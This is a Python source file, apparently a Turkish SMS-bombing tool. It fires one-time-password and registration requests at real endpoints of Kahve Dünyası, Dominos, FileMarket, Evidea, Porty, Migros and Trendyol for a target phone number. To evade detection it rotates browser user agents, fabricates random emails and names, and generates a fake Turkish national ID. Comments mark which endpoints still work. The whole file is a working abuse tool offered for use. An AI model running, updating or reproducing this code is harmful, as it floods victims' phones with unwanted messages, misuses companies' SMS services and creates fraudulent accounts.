import requests
from random import choice, randint
from string import ascii_lowercase, digits
from colorama import Fore, Style

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0",
]

MAIL_DOMAINS = [
    "@gmail.com", "@outlook.com", "@hotmail.com", "@yahoo.com",
    "@protonmail.com", "@icloud.com", "@yandex.com", "@mail.com"
]


def _rand_mail():
    length = randint(10, 18)
    name = ''.join(choice(ascii_lowercase + digits) for _ in range(length))
    return name + choice(MAIL_DOMAINS)


def _rand_name():
    isimler = ["Ahmet", "Mehmet", "Ali", "Veli", "Kemal", "Osman", "Yusuf", "Hasan", "Murat", "Emre"]
    soyisimler = ["Yilmaz", "Kaya", "Demir", "Sahin", "Celik", "Aydin", "Ozturk", "Arslan", "Dogan", "Kilic"]
    return choice(isimler), choice(soyisimler)


class SendSms:
    def __init__(self, phone, mail):
        self.adet = 0

        rakam = [randint(1, 9)]
        for _ in range(8):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0]+rakam[2]+rakam[4]+rakam[6]+rakam[8])*7 - (rakam[1]+rakam[3]+rakam[5]+rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        self.tc = "".join(str(r) for r in rakam)

        self.phone = str(phone)
        self.mail = mail if (mail and "@" in mail) else _rand_mail()

    def _get_ua(self):
        return choice(USER_AGENTS)

    def _ok(self, name):
        print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> {name}")
        self.adet += 1

    def _err(self, name, msg):
        print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> {name} ({msg})")

    # ================================================================
    # ========================  SERVİSLER  ===========================
    # ================================================================

    # 1) Kahve Dünyası ✅ ÇALIŞIYOR
    def KahveDunyasi(self):
        try:
            r = requests.post(
                "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "X-Language-Id": "tr-TR",
                    "X-Client-Platform": "web",
                    "Origin": "https://www.kahvedunyasi.com",
                    "Referer": "https://www.kahvedunyasi.com/"
                },
                json={"countryCode": "90", "phoneNumber": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201) and r.json().get("processStatus") == "Success":
                self._ok("KahveDünyası")
            else:
                self._err("KahveDünyası", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("KahveDünyası", type(e).__name__)

    # 2) Dominos ✅ ÇALIŞIYOR
    def Dominos(self):
        try:
            r = requests.post(
                "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json;charset=utf-8",
                    "Accept": "application/json, text/plain, */*",
                    "Servicetype": "CarryOut",
                    "Locationcode": "undefined",
                    "Appversion": "IOS-7.1.0"
                },
                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201) and r.json().get("isSuccess"):
                self._ok("Dominos")
            else:
                self._err("Dominos", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Dominos", type(e).__name__)

    # 3) FileMarket ✅ FİX: 202 de başarı sayılıyor artık
    def File(self):
        try:
            r = requests.post(
                "https://api.filemarket.com.tr/v1/otp/send",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "X-Os": "IOS",
                    "X-Version": "1.7",
                    "Accept-Language": "tr-TR"
                },
                json={"mobilePhoneNumber": f"90{self.phone}"},
                timeout=8
            )
            # 202 Accepted da başarı → FİX
            if r.status_code in (200, 201, 202):
                self._ok("FileMarket")
            else:
                self._err("FileMarket", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("FileMarket", type(e).__name__)

    # 4) Evidea ✅ FİX: İstek gövdesi ve header güncellendi
    def Evidea(self):
        try:
            boundary = "WebKitFormBoundaryXoX8XoX8XoX8XoX8"
            ad, soyad = _rand_name()
            data = (
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\n{ad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\n{soyad}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\nAbc123!_xyz9\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n"
                f"--{boundary}\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n"
                f"--{boundary}--\r\n"
            )
            r = requests.post(
                "https://www.evidea.com/users/register/",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "X-App-Type": "akinon-mobile",
                    "X-App-Device": "ios",
                    "Accept": "application/json, text/plain, */*",
                    "Referer": "https://www.evidea.com/"
                },
                data=data,
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Evidea")
            else:
                self._err("Evidea", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Evidea", type(e).__name__)

    # 5) Porty
    def Porty(self):
        try:
            r = requests.post(
                "https://panel.porty.tech/api.php",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json"
                },
                json={"job": "start_login", "phone": self.phone},
                timeout=10
            )
            if r.status_code == 200 and "success" in r.text.lower():
                self._ok("Porty")
            else:
                self._err("Porty", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Porty", type(e).__name__)

    # 6) Migros
    def Migros(self):
        try:
            r = requests.post(
                "https://www.migros.com.tr/rest/users/login/otp",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "Origin": "https://www.migros.com.tr",
                    "Referer": "https://www.migros.com.tr/giris"
                },
                json={"phoneNumber": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Migros")
            else:
                self._err("Migros", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Migros", type(e).__name__)

    # 7) Trendyol
    def Trendyol(self):
        try:
            r = requests.post(
                "https://api.trendyol.com/authentication/v2/register/phone",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json",
                    "Origin": "https://www.trendyol.com",
                    "Referer": "https://www.trendyol.com/giris"
                },
                json={"gsmNumber": self.phone},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Trendyol")
            else:
                self._err("Trendyol", f"HTTP {r.status_code}")
        except Exception as e:
            self._err("Trendyol", type(e).__name__)

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
